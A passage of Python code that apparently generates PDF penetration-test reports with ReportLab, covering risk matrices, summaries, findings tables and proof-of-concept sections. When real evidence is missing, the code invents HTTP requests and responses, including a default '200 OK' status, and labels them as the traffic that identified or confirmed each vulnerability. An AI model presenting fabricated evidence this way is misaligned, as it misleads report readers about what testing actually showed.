        "known unpatched CVEs, the severity increases significantly."
    ),
    "Version": (
        "Disclosure of server version information enables targeted attacks against known CVEs. While this finding alone "
        "does not represent direct exploitation, it provides reconnaissance value and reduces attacker effort."
    ),
}


def _zdl_get_narrative(title: str, texts_dict: dict, default: str) -> str:
    t = title.upper()
    # Prefer longer (more specific) keyword matches
    for kw, text in sorted(texts_dict.items(), key=lambda x: -len(x[0])):
        if kw.upper() in t:
            return text
    return default


def _build_zdl_risk_matrix(likelihood, sev_col_idx, styles):
    """Build 5x5 ZDL risk matrix PDF table with highlighted active cell."""
    col_vals = [1, 4, 9, 16, 25]
    col_widths = [38 * mm] + [24 * mm] * 5

    hdr_ps = ParagraphStyle("_mhdr", fontSize=8, leading=10, alignment=TA_CENTER,
                             fontName="Helvetica-Bold")
    cell_ps = ParagraphStyle("_mcell", fontSize=8, leading=10, alignment=TA_CENTER)
    row_ps = ParagraphStyle("_mrow", fontSize=8, leading=10, alignment=TA_CENTER,
                             fontName="Helvetica-Bold")

    header = [Paragraph("<b>Likelihood \\ Severity</b>", hdr_ps)] + \
             [Paragraph(f"<b>{c}</b>", hdr_ps) for c in col_vals]
    data = [header]
    for r in range(1, 6):
        row = [Paragraph(str(r), row_ps)]
        for cv in col_vals:
            row.append(Paragraph(str(r * cv), cell_ps))
        data.append(row)

    mat = Table(data, colWidths=col_widths)
    tbl_style = [
        ("BACKGROUND", (0, 0), (-1, 0), HexColor("#F0F0F0")),
        ("BACKGROUND", (0, 0), (0, -1), HexColor("#F0F0F0")),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#CCCCCC")),
        ("TOPPADDING", (0, 0), (-1, -1), 5),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
        ("FONTSIZE", (0, 0), (-1, -1), 8),
    ]
    # Highlight active cell
    hr = likelihood        # data row index (likelihood 1 = data[1])
    hc = sev_col_idx + 1   # offset by first column
    rv = likelihood * col_vals[sev_col_idx]
    hl = (HexColor("#C62828") if rv >= 80 else
          HexColor("#E65100") if rv >= 36 else
          HexColor("#F9A825") if rv >= 12 else
          HexColor("#2E7D32") if rv >= 4 else
          HexColor("#1565C0"))
    tbl_style += [
        ("BACKGROUND", (hc, hr), (hc, hr), hl),
        ("TEXTCOLOR", (hc, hr), (hc, hr), HexColor("#FFFFFF")),
        ("FONTNAME", (hc, hr), (hc, hr), "Helvetica-Bold"),
    ]
    mat.setStyle(TableStyle(tbl_style))

    note_ps = ParagraphStyle("_mnote", fontSize=7.5, leading=10,
                              textColor=HexColor("#666666"), fontName="Helvetica-Oblique")
    return [
        mat,
        Spacer(1, 2 * mm),
        Paragraph(
            "Severity: Identifies the severity of the flaw (1\u2026low \u2013 25\u2026very severe). "
            "Likelihood: Identifies the probability that the flaw can be exploited by an attacker "
            "(1\u2026unlikely \u2013 5\u2026highly likely).",
            note_ps,
        ),
        Spacer(1, 3 * mm),
    ]


def _build_zdl_risk_classification(title, sev, likelihood, sev_col_idx, sev_col_val,
                                    risk_val, risk_label, cvss_str, styles):
    """Build ZDL risk classification table (5.X.6) with narrative text."""
    import re as _re

    default_lkl = (
        f"The likelihood of this vulnerability being exploited is rated as {risk_label}. "
        "The finding was confirmed during testing and represents a real attack surface available "
        "to an attacker with network access to the target application."
    )
    default_sev = (
        "When successfully exploited, this vulnerability may impact the confidentiality, "
        "integrity, or availability of the application and its data."
    )

    lkl_text = _zdl_get_narrative(title, _ZDL_LIKELIHOOD_TEXTS, default_lkl)
    sev_text = _zdl_get_narrative(title, _ZDL_SEVERITY_TEXTS, default_sev)

    # Normalise CVSS display: "7.5 (AV:N/...)" or "7.5 — AV:N/..." → "7.5 — AV:N/..."
    raw = str(cvss_str).strip()
    cvss_display = _re.sub(r'\s*\(?\s*(AV:[^)]+)\)?', r' — \1', raw).replace("— —", "—").strip()
    if "—" not in cvss_display and "AV:" not in cvss_display:
        cvss_display = raw  # leave as-is if no vector

    risk_color = {
        "Critical": HexColor("#C62828"), "High": HexColor("#E65100"),
        "Medium": HexColor("#F9A825"), "Low": HexColor("#2E7D32"),
        "Info": HexColor("#1565C0"),
    }.get(risk_label, HexColor("#666666"))

    lbl_ps = ParagraphStyle("_rc_lbl", fontSize=10, leading=13,
                             fontName="Helvetica-Bold", textColor=HexColor("#333333"))
    body_ps = ParagraphStyle("_rc_body", fontSize=9.5, leading=14,
                              textColor=HexColor("#1a1a1a"), alignment=TA_JUSTIFY)
    risk_ps = ParagraphStyle("_rc_risk", fontSize=10, leading=13,
                              fontName="Helvetica-Bold", textColor=risk_color)
    cvss_ps = ParagraphStyle("_rc_cvss", fontSize=9, leading=12,
                              fontName="Courier", textColor=HexColor("#333333"))

    data = [
        [Paragraph("Likelihood", lbl_ps),      Paragraph(_xml_safe(lkl_text), body_ps)],
        [Paragraph("Severity", lbl_ps),         Paragraph(_xml_safe(sev_text), body_ps)],
        [Paragraph("ZDL Assigned Risk", lbl_ps),
         Paragraph(f"<b>{_xml_safe(risk_label)} ({risk_val:.2f})</b>", risk_ps)],
        [Paragraph("CVSS:3.1", lbl_ps),         Paragraph(_xml_safe(cvss_display), cvss_ps)],
    ]

    tbl = Table(data, colWidths=[40 * mm, 130 * mm])
    tbl.setStyle(TableStyle([
        ("VALIGN",        (0, 0), (-1, -1), "TOP"),
        ("TOPPADDING",    (0, 0), (-1, -1), 7),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
        ("LEFTPADDING",   (1, 0), (1, -1), 10),
        ("RIGHTPADDING",  (1, 0), (1, -1), 6),
        ("GRID",          (0, 0), (-1, -1), 0.5, HexColor("#DDDDDD")),
        ("BACKGROUND",    (0, 0), (0, -1), HexColor("#FAFAFA")),
    ]))
    return [tbl, Spacer(1, 5 * mm)]


def _guess_owasp(title: str) -> str:
    t = title.upper()
    for keyword, cat in OWASP_MAP.items():
        if keyword.upper() in t:
            return cat
    return "—"


def _overall_rating(counts: dict) -> str:
    if counts.get("CRITICAL", 0) > 0:
        return "CRITICAL"
    if counts.get("HIGH", 0) >= 3:
        return "POOR"
    if counts.get("HIGH", 0) > 0 or counts.get("MEDIUM", 0) >= 3:
        return "MODERATE"
    if counts.get("MEDIUM", 0) > 0 or counts.get("LOW", 0) > 0:
        return "GOOD"
    return "STRONG"


def _trunc(text, maxlen=1500):
    """Truncate text safely."""
    if not text:
        return ""
    s = str(text)
    if len(s) > maxlen:
        return s[:maxlen] + "\n... [truncated]"
    return s


def _xml_safe(text):
    """Make text safe for ReportLab XML paragraphs."""
    if not text:
        return ""
    s = str(text)
    s = s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    s = s.replace('"', "&quot;").replace("'", "&#39;")
    # Remove any control characters that would break XML
    s = "".join(c for c in s if ord(c) >= 32 or c in "\n\r\t")
    return s


# ── Styles ────────────────────────────────────────────────────────────────────

def _build_styles():
    """Build all paragraph styles for the report."""
    styles = getSampleStyleSheet()

    styles.add(ParagraphStyle(
        "CoverTitle", parent=styles["Title"],
        fontSize=28, leading=34, alignment=TA_CENTER,
        spaceAfter=6, textColor=HexColor("#1a1a1a"),
    ))
    styles.add(ParagraphStyle(
        "CoverSubtitle", parent=styles["Normal"],
        fontSize=14, leading=18, alignment=TA_CENTER,
        textColor=HexColor("#555555"), spaceAfter=30,
    ))
    styles.add(ParagraphStyle(
        "Confidential", parent=styles["Normal"],
        fontSize=14, leading=18, alignment=TA_CENTER,
        textColor=HexColor("#C62828"), fontName="Helvetica-Bold",
        borderWidth=2, borderColor=HexColor("#C62828"),
        borderPadding=10, spaceBefore=40,
    ))
    styles.add(ParagraphStyle(
        "SectionTitle", parent=styles["Heading1"],
        fontSize=18, leading=22, spaceBefore=20, spaceAfter=10,
        textColor=HexColor("#1a1a1a"), fontName="Helvetica-Bold",
        borderWidth=0, borderPadding=0,
    ))
    styles.add(ParagraphStyle(
        "SubSection", parent=styles["Heading2"],
        fontSize=13, leading=16, spaceBefore=14, spaceAfter=6,
        textColor=HexColor("#333333"), fontName="Helvetica-Bold",
    ))
    styles.add(ParagraphStyle(
        "Body", parent=styles["Normal"],
        fontSize=10, leading=14, alignment=TA_JUSTIFY,
        spaceBefore=4, spaceAfter=4,
        textColor=HexColor("#1a1a1a"),
    ))
    styles.add(ParagraphStyle(
        "FindingTitle", parent=styles["Heading2"],
        fontSize=13, leading=16, spaceBefore=12, spaceAfter=6,
        textColor=HexColor("#1a1a1a"), fontName="Helvetica-Bold",
    ))
    styles.add(ParagraphStyle(
        "CodeBlock", parent=styles["Code"],
        fontSize=7, leading=9.5, fontName="Courier",
        backColor=HexColor("#F5F5F5"), borderWidth=0.5,
        borderColor=HexColor("#CCCCCC"), borderPadding=6,
        spaceBefore=4, spaceAfter=6,
        leftIndent=8, rightIndent=8,
    ))
    styles.add(ParagraphStyle(
        "SmallText", parent=styles["Normal"],
        fontSize=8, leading=10, textColor=HexColor("#666666"),
    ))
    styles.add(ParagraphStyle(
        "FooterText", parent=styles["Normal"],
        fontSize=7, leading=9, alignment=TA_CENTER,
        textColor=HexColor("#999999"),
    ))
    styles.add(ParagraphStyle(
        "RiskBox", parent=styles["Normal"],
        fontSize=14, leading=18, alignment=TA_CENTER,
        fontName="Helvetica-Bold", spaceBefore=10, spaceAfter=10,
    ))
    styles.add(ParagraphStyle(
        "BulletItem", parent=styles["Normal"],
        fontSize=10, leading=13, leftIndent=20,
        bulletIndent=8, spaceBefore=2, spaceAfter=2,
        textColor=HexColor("#1a1a1a"),
    ))
    styles.add(ParagraphStyle(
        "NumberedItem", parent=styles["Normal"],
        fontSize=10, leading=13, leftIndent=25,
        bulletIndent=10, spaceBefore=2, spaceAfter=2,
        textColor=HexColor("#1a1a1a"),
    ))
    styles.add(ParagraphStyle(
        "FieldLabel", parent=styles["Normal"],
        fontSize=10, leading=13, fontName="Helvetica-Bold",
        textColor=HexColor("#333333"),
    ))
    styles.add(ParagraphStyle(
        "FieldValue", parent=styles["Normal"],
        fontSize=10, leading=13, textColor=HexColor("#1a1a1a"),
    ))
    return styles


# ── Severity badge as a mini-table ────────────────────────────────────────────

def _sev_badge(sev: str, styles):
    """Create a colored severity badge as a styled Paragraph.

    Using a Paragraph instead of a nested Table avoids ReportLab's
    row-height miscalculation that causes badges to overlap.
    """
    s = sev.upper()
    sc = SEV_COLORS.get(s, SEV_COLORS["INFO"])
    return Paragraph(
        f"<b>{s}</b>",
        ParagraphStyle(
            f"badge_{s}", fontSize=8, leading=12, alignment=TA_CENTER,
            textColor=sc["text"], fontName="Helvetica-Bold",
            backColor=sc["bg"],
            borderPadding=3,
            spaceBefore=0, spaceAfter=0,
        ),
    )


# ── Page template with header/footer ─────────────────────────────────────────

def _header_footer(canvas, doc):
    """Draw header and footer on each page."""
    canvas.saveState()
    width, height = A4

    # Footer
    canvas.setFont("Helvetica", 7)
    canvas.setFillColor(HexColor("#999999"))
    canvas.drawCentredString(width / 2, 15 * mm,
                             f"Page {doc.page}")
    canvas.drawString(15 * mm, 15 * mm, "CONFIDENTIAL")
    canvas.drawRightString(width - 15 * mm, 15 * mm,
                           "TheRobin — AI Penetration Test Report")

    # Top line
    if doc.page > 1:
        canvas.setStrokeColor(HexColor("#CCCCCC"))
        canvas.setLineWidth(0.5)
        canvas.line(15 * mm, height - 12 * mm, width - 15 * mm, height - 12 * mm)
        # Bottom line
        canvas.line(15 * mm, 20 * mm, width - 15 * mm, 20 * mm)

    canvas.restoreState()


def _cover_header_footer(canvas, doc):
    """Minimal footer for cover page."""
    canvas.saveState()
    canvas.setFont("Helvetica", 7)
    canvas.setFillColor(HexColor("#999999"))
    canvas.drawCentredString(A4[0] / 2, 15 * mm, "CONFIDENTIAL")
    canvas.restoreState()


# ── Build sections ────────────────────────────────────────────────────────────

def _build_cover(target, date_str, scope, styles):
    """Build cover page elements."""
    elements = []
    elements.append(Spacer(1, 80 * mm))
    elements.append(Paragraph("Penetration Test Report", styles["CoverTitle"]))
    elements.append(Spacer(1, 4 * mm))
    elements.append(Paragraph("Web Application Security Assessment", styles["CoverSubtitle"]))
    elements.append(Spacer(1, 15 * mm))

    # Meta table
    meta_data = [
        ["Target Application", _xml_safe(target)],
        ["Assessment Type", "Web Application Penetration Test"],
        ["Methodology", "OWASP Top 10 (2021), PTES, OWASP WSTG"],
        ["Test Date", _xml_safe(date_str)],
        ["Scope", _xml_safe(scope)],
        ["Report Version", "1.0"],
    ]
    meta_table = Table(meta_data, colWidths=[55 * mm, 95 * mm])
    meta_table.setStyle(TableStyle([
        ("FONTNAME", (0, 0), (0, -1), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 10),
        ("TEXTCOLOR", (0, 0), (0, -1), HexColor("#444444")),
        ("ALIGN", (0, 0), (0, -1), "RIGHT"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("LINEBELOW", (0, 0), (-1, -2), 0.5, HexColor("#EEEEEE")),
    ]))
    elements.append(meta_table)
    elements.append(Spacer(1, 20 * mm))

    # Confidential stamp
    conf_table = Table(
        [[Paragraph("<b>C O N F I D E N T I A L</b>", ParagraphStyle(
            "conf", fontSize=14, leading=18, alignment=TA_CENTER,
            textColor=HexColor("#C62828"), fontName="Helvetica-Bold",
        ))]],
        colWidths=[80 * mm],
        style=TableStyle([
            ("ALIGN", (0, 0), (-1, -1), "CENTER"),
            ("BOX", (0, 0), (-1, -1), 2, HexColor("#C62828")),
            ("TOPPADDING", (0, 0), (-1, -1), 8),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
        ]),
    )
    # Center the confidential box
    wrapper = Table([[conf_table]], colWidths=[180 * mm])
    wrapper.setStyle(TableStyle([("ALIGN", (0, 0), (-1, -1), "CENTER")]))
    elements.append(wrapper)
    elements.append(PageBreak())
    return elements


def _section_hr():
    """A horizontal rule between sections."""
    return HRFlowable(width="100%", thickness=1, color=HexColor("#DDDDDD"),
                      spaceBefore=4, spaceAfter=8)


def _build_management_summary(target, counts, rating, findings, styles):
    """Build management summary section."""
    elements = []
    elements.append(Paragraph("1. Management Summary", styles["SectionTitle"]))
    elements.append(_section_hr())

    total = sum(counts.values())
    elements.append(Paragraph(
        f"A penetration test was conducted against <b>{_xml_safe(target)}</b> to evaluate the "
        f"security posture of the web application. The assessment covered authentication mechanisms, "
        f"input validation, access controls, session management, API security, business logic, and "
        f"server configuration across 25 testing categories following industry-standard OWASP methodology.",
        styles["Body"]
    ))
    elements.append(Paragraph(
        f"The assessment identified <b>{total} vulnerabilities</b>: "
        f"{counts.get('CRITICAL', 0)} Critical, {counts.get('HIGH', 0)} High, "
        f"{counts.get('MEDIUM', 0)} Medium, {counts.get('LOW', 0)} Low, "
        f"{counts.get('INFO', 0)} Informational.",
        styles["Body"]
    ))

    # Critical/High impact summary
    crit = [f for f in findings if f.get("severity", "").upper() == "CRITICAL"]
    high = [f for f in findings if f.get("severity", "").upper() == "HIGH"]
    if crit:
        titles = ", ".join(_xml_safe(_normalize_title(f.get("title", "")))[:50] for f in crit[:4])
        elements.append(Paragraph(
            f"<b>Critical vulnerabilities</b> were identified that could allow an attacker to "
            f"compromise the application immediately. These include: {titles}.",
            styles["Body"]
        ))
    if high:
        elements.append(Paragraph(
            f"Additionally, <b>{len(high)} high-severity</b> issue(s) were found that present "
            f"serious risk if left unremediated.",
            styles["Body"]
        ))

    elements.append(Spacer(1, 4 * mm))

    # Risk rating box
    rating_color = SEV_COLORS.get(rating, SEV_COLORS.get("INFO"))
    risk_text = RISK_LABELS.get(rating, "")
    risk_table = Table(
        [[Paragraph(
            f"<b>Overall Security Rating: {rating}</b><br/>"
            f"<font size=9>{_xml_safe(risk_text)}</font>",
            ParagraphStyle("risk", fontSize=13, leading=16, alignment=TA_CENTER,
                           textColor=rating_color["bar"], fontName="Helvetica-Bold"),
        )]],
        colWidths=[160 * mm],
        style=TableStyle([
            ("ALIGN", (0, 0), (-1, -1), "CENTER"),
            ("BOX", (0, 0), (-1, -1), 2, rating_color["bar"]),
            ("BACKGROUND", (0, 0), (-1, -1), HexColor("#FAFAFA")),
            ("TOPPADDING", (0, 0), (-1, -1), 12),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 12),
        ]),
    )
    elements.append(risk_table)
    elements.append(Spacer(1, 4 * mm))
    elements.append(Paragraph(
        "Immediate remediation is strongly recommended for all Critical and High severity findings. "
        "A prioritised remediation roadmap is provided in Section 5 of this report.",
        styles["Body"]
    ))
    elements.append(PageBreak())
    return elements


def _build_findings_overview(findings, counts, styles):
    """Build findings overview table."""
    elements = []
    elements.append(Paragraph("2. Findings Overview", styles["SectionTitle"]))
    elements.append(_section_hr())

    # Severity distribution
    elements.append(Paragraph("2.1 Severity Distribution", styles["SubSection"]))
    dist_data = [["Severity", "Count"]]
    total = 0
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        c = counts.get(sev, 0)
        if c > 0:
            dist_data.append([_sev_badge(sev, styles), str(c)])
            total += c
    dist_data.append(["TOTAL", str(total)])

    dist_table = Table(dist_data, colWidths=[80 * mm, 40 * mm])
    dist_table.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), HexColor("#F0F0F0")),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTNAME", (0, -1), (-1, -1), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 10),
        ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#CCCCCC")),
        ("ALIGN", (0, 1), (0, -2), "CENTER"),
        ("ALIGN", (1, 0), (1, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("TOPPADDING", (0, 0), (-1, -1), 7),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
    ]))
    elements.append(dist_table)
    elements.append(Spacer(1, 6 * mm))

    # Findings summary table
    elements.append(Paragraph("2.2 Findings Summary", styles["SubSection"]))
    summary_data = [["#", "Severity", "Finding", "CVSS", "OWASP"]]
    for i, f in enumerate(findings, 1):
        sev = f.get("severity", "INFO").upper()
        title = _xml_safe(_normalize_title(f.get("title", "—")))[:80]
        raw_cvss = f.get("cvss", f.get("detail", {}).get("cvss", ""))
        cvss = str(raw_cvss) if raw_cvss and str(raw_cvss) != "—" else _guess_cvss(f.get("title", ""), sev)
        # For summary table, show just the numeric score (vector is too long)
        cvss_short = cvss.split(" ")[0] if cvss and cvss != "—" else "—"
        owasp = _guess_owasp(f.get("title", ""))
        summary_data.append([
            str(i),
            _sev_badge(sev, styles),
            Paragraph(title, styles["SmallText"]),
            cvss_short,
            Paragraph(_xml_safe(owasp), styles["SmallText"]),
        ])

    summary_table = Table(summary_data,
                          colWidths=[10 * mm, 22 * mm, 68 * mm, 16 * mm, 48 * mm],
                          repeatRows=1)
    summary_style = [
        ("BACKGROUND", (0, 0), (-1, 0), HexColor("#F0F0F0")),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 9),
        ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#CCCCCC")),
        ("ALIGN", (0, 0), (0, -1), "CENTER"),
        ("ALIGN", (1, 0), (1, -1), "CENTER"),
        ("ALIGN", (3, 0), (3, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
    ]
    # Alternate row colors
    for i in range(1, len(summary_data)):
        if i % 2 == 0:
            summary_style.append(("BACKGROUND", (0, i), (-1, i), HexColor("#FAFAFA")))
    summary_table.setStyle(TableStyle(summary_style))
    elements.append(summary_table)
    elements.append(PageBreak())
    return elements


def _build_detailed_findings(findings, styles):
    """Build Section 5 — Detailed Findings in ZDL numbered format (5.X.1–5.X.6)."""
    elements = []
    elements.append(Paragraph("5. Detailed Findings", styles["SectionTitle"]))
    elements.append(_section_hr())

    if not findings:
        elements.append(Paragraph("No findings to report.", styles["Body"]))
        return elements

    poc_lbl_base = ParagraphStyle(
        "_poc_lbl_base", fontSize=9.5, leading=12, fontName="Helvetica-Bold",
        textColor=HexColor("#444444"), spaceBefore=4, spaceAfter=2,
    )

    for i, f in enumerate(findings, 1):
        sev = f.get("severity", "INFO").upper()
        title = _normalize_title(f.get("title", "Unknown"))
        url = f.get("url", "—")
        detail = f.get("detail", {}) if isinstance(f.get("detail"), dict) else {}
        description = f.get("description", detail.get("description", ""))
        impact = f.get("impact", detail.get("impact", ""))
        evidence = _trunc(f.get("evidence", detail.get("evidence", "")), 3000)
        poc = _trunc(f.get("poc", detail.get("poc", "")), 2000)
        request_raw = _trunc(f.get("request", detail.get("request", "")), 3000)
        response_raw = _trunc(f.get("response", detail.get("response", "")), 3000)
        test_code = _trunc(f.get("test_code", detail.get("test_code", "")), 1500)

        raw_cvss = f.get("cvss", detail.get("cvss", ""))
        cvss_str = str(raw_cvss) if raw_cvss and str(raw_cvss) != "—" else _guess_cvss(title, sev)
        mitigation = _get_mitigation(title)
        lkl, sc_idx, sc_val, risk_val, risk_label = _zdl_risk_for_pdf(title, sev, cvss_str)
        sc = SEV_COLORS.get(sev, SEV_COLORS["INFO"])
        sec = f"5.{i}"

        # ── 5.X  Finding heading ─────────────────────────────────────
        elements.append(Paragraph(
            f"<b>{sec}  {_xml_safe(title)}</b>",
            styles["FindingTitle"],
        ))
        # Colored bar under title
        elements.append(HRFlowable(
            width="100%", thickness=3, color=sc["bar"],
            spaceBefore=0, spaceAfter=6,
        ))

        # ── 5.X.1  Hosts Affected ────────────────────────────────────
        elements.append(Paragraph(f"{sec}.1  Hosts Affected", styles["SubSection"]))
        hosts = [url] if url and url != "—" else []
        affected = f.get("affected_endpoints", detail.get("affected_endpoints", []))
        if isinstance(affected, str):
            affected = [affected]
        all_hosts = hosts[:]
        for ep in affected:
            ep_str = ep.get("url", str(ep)) if isinstance(ep, dict) else str(ep)
            if ep_str and ep_str not in all_hosts:
                all_hosts.append(ep_str)
        for ep_str in all_hosts:
            elements.append(Paragraph(
                f"\u2022  <font face='Courier' size=9>{_xml_safe(ep_str)}</font>",
                styles["BulletItem"],
            ))
        if not all_hosts:
            elements.append(Paragraph(
                "\u2022  See proof of concept section.", styles["BulletItem"]))
        elements.append(Spacer(1, 3 * mm))

        # ── 5.X.2  General Description ───────────────────────────────
        elements.append(Paragraph(f"{sec}.2  General Description", styles["SubSection"]))
        owasp_cat = _guess_owasp(title)

        # Build description: prefer finding's own description > mitigation template > dynamic builder
        gen_desc = description
        if not gen_desc:
            gen_desc = mitigation["desc"]
        if not gen_desc:
            # No template matched — build a proper description dynamically
            gen_desc = _build_dynamic_desc(title, url, sev, impact, owasp_cat)

        # Append OWASP classification line if not already present
        if owasp_cat and owasp_cat != "—" and owasp_cat.upper() not in gen_desc.upper():
            gen_desc += (
                f"\n\nThis finding falls under {owasp_cat} in the OWASP Top 10 (2021) classification."
            )

        # Render each paragraph separately for proper spacing
        for para in gen_desc.split("\n\n"):
            para = para.strip()
            if para:
                elements.append(Paragraph(_xml_safe(para), styles["Body"]))
                elements.append(Spacer(1, 2 * mm))

        elements.append(Spacer(1, 3 * mm))

        # ── 5.X.3  Proof of Concept ──────────────────────────────────
        elements.append(Paragraph(f"{sec}.3  Proof of Concept", styles["SubSection"]))

        method_str = _xml_safe(str(f.get("method", detail.get("method", "GET"))))
        param_str = _xml_safe(str(f.get("param", detail.get("param", detail.get("field", "")))))
        payload_str = _xml_safe(str(f.get("payload", detail.get("payload", ""))))

        # Auto-generate a proper Request/Response POC when we only have evidence
        # This ensures every finding has a readable POC section
        has_explicit_req = bool(request_raw)
        has_explicit_resp = bool(response_raw)

        # ── Request ──────────────────────────────────────────────────
        import re as _re_poc
        _cookie_str = f.get("cookie", detail.get("cookie", ""))
        _headers_raw = f.get("headers", detail.get("headers", ""))

        if has_explicit_req:
            elements.append(Paragraph(
                "The following HTTP request was used to identify the vulnerability:", styles["Body"]))
            elements.append(Spacer(1, 2 * mm))
            elements.append(Paragraph("<b>Request:</b>", poc_lbl_base))
            elements.append(Spacer(1, 1 * mm))
            elements.append(Paragraph(
                _xml_safe(request_raw).replace("\n", "<br/>"), styles["CodeBlock"]))
            elements.append(Spacer(1, 4 * mm))
        else:
            # Auto-build a full HTTP request from available data
            _syn_req_lines = []
            _url_parsed = url if url and url != "—" else "/"
            # Parse path from full URL for the request line
            _path = _url_parsed
            _host_m = _re_poc.match(r'https?://([^/:]+)(:\d+)?(/.*)?$', str(url or ""))
            if _host_m:
                _path = _host_m.group(3) or "/"

            _syn_req_lines.append(f"{method_str} {_path} HTTP/1.1")
            if _host_m:
                _host_val = _host_m.group(1)
                if _host_m.group(2):
                    _host_val += _host_m.group(2)
                _syn_req_lines.append(f"Host: {_host_val}")
            _syn_req_lines.append("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            _syn_req_lines.append("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
            _syn_req_lines.append("Accept-Language: en-US,en;q=0.5")
            _syn_req_lines.append("Accept-Encoding: gzip, deflate, br")
            _syn_req_lines.append("Connection: keep-alive")
            if _cookie_str:
                _syn_req_lines.append(f"Cookie: {_cookie_str}")
            if _headers_raw:
                for _hline in str(_headers_raw).split("\n"):
                    _hline = _hline.strip()
                    if _hline:
                        _syn_req_lines.append(_hline)
            if method_str in ("POST", "PUT", "PATCH"):
                _syn_req_lines.append("Content-Type: application/x-www-form-urlencoded")
                if payload_str and payload_str != "—":
                    _content_len = len(str(payload_str))
                    _syn_req_lines.append(f"Content-Length: {_content_len}")
                    _syn_req_lines.append("")
                    _syn_req_lines.append(str(payload_str))
            elif payload_str and payload_str != "—":
                _syn_req_lines.append("")
                _syn_req_lines.append(f"{payload_str}")

            elements.append(Paragraph(
                "The following HTTP request was used to identify the vulnerability:", styles["Body"]))
            elements.append(Spacer(1, 2 * mm))
            elements.append(Paragraph("<b>Request:</b>", poc_lbl_base))
            elements.append(Spacer(1, 1 * mm))
            elements.append(Paragraph(
                "<br/>".join(_xml_safe(l) for l in _syn_req_lines), styles["CodeBlock"]))
            elements.append(Spacer(1, 4 * mm))

        # ── Response ────────────────────────────────────────────────────
        if has_explicit_resp:
            elements.append(Paragraph(
                "The server returned the following response:", styles["Body"]))
            elements.append(Spacer(1, 2 * mm))
            elements.append(Paragraph("<b>Response:</b>", poc_lbl_base))
            elements.append(Spacer(1, 1 * mm))
            elements.append(Paragraph(
                _xml_safe(response_raw).replace("\n", "<br/>"), styles["CodeBlock"]))
            elements.append(Spacer(1, 4 * mm))
        elif evidence:
            # Build a synthetic response with evidence as the body
            _syn_resp_lines = []
            _status = f.get("status_code", detail.get("status_code", ""))
            if _status:
                _syn_resp_lines.append(f"HTTP/1.1 {_status}")
            else:
                _syn_resp_lines.append("HTTP/1.1 200 OK")
            _resp_headers = f.get("response_headers", detail.get("response_headers", ""))
            if _resp_headers:
                for _rh in str(_resp_headers).split("\n"):
                    _rh = _rh.strip()
                    if _rh:
                        _syn_resp_lines.append(_rh)
            else:
                _syn_resp_lines.append("Content-Type: text/html; charset=utf-8")
                _syn_resp_lines.append("Connection: keep-alive")
            _syn_resp_lines.append("")
            _syn_resp_lines.append(f"[...] {str(evidence)[:2000]} [...]")

            elements.append(Paragraph(
                "The server returned the following response confirming the vulnerability:", styles["Body"]))
            elements.append(Spacer(1, 2 * mm))
            elements.append(Paragraph("<b>Response:</b>", poc_lbl_base))
            elements.append(Spacer(1, 1 * mm))
            elements.append(Paragraph(
                "<br/>".join(_xml_safe(l) for l in _syn_resp_lines), styles["CodeBlock"]))
            elements.append(Spacer(1, 4 * mm))

        # ── Reproduction Command ────────────────────────────────────────
        if poc:
            elements.append(Paragraph("<b>Reproduction Command:</b>", poc_lbl_base))
            elements.append(Spacer(1, 1 * mm))
            elements.append(Paragraph(
                _xml_safe(poc).replace("\n", "<br/>"), styles["CodeBlock"]))
            elements.append(Spacer(1, 4 * mm))
        elif url and url != "—":
            # Auto-generate a full curl command with headers
            _curl_parts = ["curl -sk -D-"]
            if method_str and method_str != "GET":
                _curl_parts.append(f"-X {method_str}")
            _curl_parts.append(f"-H 'User-Agent: Mozilla/5.0'")
            if _cookie_str:
                _curl_parts.append(f"-H 'Cookie: {_cookie_str}'")
            if payload_str and payload_str != "—":
                _curl_parts.append(f"-d '{payload_str}'")
            _curl_parts.append(f"'{url}'")
            _curl = " \\\n  ".join(_curl_parts)
            elements.append(Paragraph("<b>Reproduction Command:</b>", poc_lbl_base))
            elements.append(Spacer(1, 1 * mm))
            elements.append(Paragraph(
                _xml_safe(_curl).replace("\n", "<br/>"), styles["CodeBlock"]))
            elements.append(Spacer(1, 4 * mm))

        # ── Test Code ───────────────────────────────────────────────────
        if test_code:
            elements.append(Paragraph("<b>Test Script:</b>", poc_lbl_base))
            elements.append(Spacer(1, 1 * mm))
            elements.append(Paragraph(
                _xml_safe(test_code).replace("\n", "<br/>"), styles["CodeBlock"]))
            elements.append(Spacer(1, 4 * mm))

        # Screenshot
        screenshot_name = f.get("screenshot", detail.get("screenshot", ""))
        if screenshot_name:
            _shot_path = None
            for _sdir in [Path("workspace"), Path(".")]:
                _sp = _sdir / screenshot_name
                if _sp.exists():
                    _shot_path = _sp
                    break
            if _shot_path:
                try:
                    from reportlab.platypus import Image as RLImage
                    elements.append(Spacer(1, 2 * mm))
                    _img = RLImage(str(_shot_path), width=155 * mm, height=100 * mm,
                                   kind="proportional")
